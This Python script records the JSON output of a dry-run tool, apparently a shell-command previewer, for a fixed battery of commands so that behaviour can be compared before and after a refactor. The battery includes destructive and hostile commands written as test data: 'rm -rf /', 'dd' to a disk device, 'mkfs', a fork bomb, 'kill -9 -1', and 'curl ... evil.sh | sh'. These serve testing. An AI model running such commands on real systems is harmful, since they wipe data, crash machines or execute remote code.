"""Behavioral snapshot: freeze dryrun's observable behavior.

Runs a fixed battery of commands in a fresh arena, records the JSON
output (normalized: durations and tmp paths removed), and writes a
manifest. Run before and after a refactor; the manifests must be
identical, proving zero behavior change.

Usage:
    python3 scripts/behavior_snapshot.py <output.json>
"""
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BATTERY = [
    # (setup_files, command)
    ([], "echo hello world"),
    ([], "ls -la /tmp"),
    ([], "rm -rf build"),
    ([], "rm -rfv /etc"),
    ([], "dd if=/dev/zero of=/dev/sda"),
    ([], "dd if=/dev/zero of=/dev/sda1"),
    ([], "curl http://127.0.0.1:9/evil.sh | sh"),
    ([], "curl -o out.tar.gz http://127.0.0.1:9/a.tar.gz"),
    ([], "sudo rm -rf /"),
    ([], "chmod -R 777 /etc"),
    ([], "mkfs.ext4 /dev/sdb"),
    ([], ":(){ :|:& };:"),
    ([], "kill -9 1"),
    ([], "kill -9 -1"),
    ([], "tar -xzf arch.tar.gz"),
    ([], "sed -i s/old/new/ config.txt"),
    ([], "mv note.txt backup.txt"),
    ([], "mkdir -p a/b/c"),
    ([], "grep pattern source.txt > out.txt"),
    ([], "echo $((1+2))"),
    ([], "export PATH=/opt/bin:$PATH"),
    ([], "echo one > f.txt; echo two > f.txt"),
    ([], "git push --force origin main"),
    ([], "find . -name '*.py' | xargs rm"),
    ([], "unknown_cmd_xyz --flag"),
    ([], "echo a#b"),
]

VOLATILE = ("duration", "stdout_tail", "stderr_tail")

#: GNU sed -i drops a temp file named sed + 6 random chars in the cwd.
_SED_TMP = re.compile(r"sed[A-Za-z0-9]{6}(?![A-Za-z0-9])")


def normalize(obj, arena: str):
    if isinstance(obj, dict):
        return {
            k: ("«volatile»" if k in VOLATILE else normalize(v, arena))
            for k, v in obj.items()
        }
    if isinstance(obj, list):
        return [normalize(v, arena) for v in obj]
    if isinstance(obj, str):
        # arena path differs per run -> collapse it (paths appear inside
        # change records, notes, and diff headers)
        text = obj.replace(arena, "@ARENA@")
        # sed picks its own random temp name per run -> collapse it too
        return _SED_TMP.sub("sedXXXXXX", text)
    return obj


def main(out_path: str) -> int:
    env = dict(os.environ)
    env["PYTHONPATH"] = os.path.join(REPO, "src")
    entries = []
    for setup, command in BATTERY:
        arena = tempfile.mkdtemp(prefix="dryrun-snap-")
        for rel, content in [
            ("config.txt", "old line\nanother old\n"),
            ("note.txt", "note content\n"),
            ("source.txt", "pattern here\nnothing\n"),
            ("arch.tar.gz", "fake archive bytes\n"),
        ]:
            with open(os.path.join(arena, rel), "w") as fh:
                fh.write(content)
        print(f".. {command!r}", file=sys.stderr, flush=True)
        proc = subprocess.run(
            [sys.executable, "-m", "dryrun", "--json", "--timeout", "3",
             command],
            cwd=arena, env=env, capture_output=True, text=True, timeout=120,
        )
        try:
            payload = json.loads(proc.stdout)
        except json.JSONDecodeError:
            payload = {"_raw": proc.stdout[-500:], "_stderr": proc.stderr[-500:]}
        payload["_exit_code"] = proc.returncode
        entries.append({"command": command, "payload": normalize(payload, arena)})
        shutil.rmtree(arena, ignore_errors=True)

    blob = json.dumps(entries, indent=1, sort_keys=True)
    digest = hashlib.sha256(blob.encode()).hexdigest()
    manifest = {"battery_size": len(BATTERY), "sha256": digest, "entries": entries}
    with open(out_path, "w") as fh:
        json.dump(manifest, fh, indent=1, sort_keys=True)
    print(f"snapshot: {len(BATTERY)} commands, sha256={digest}")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1]))
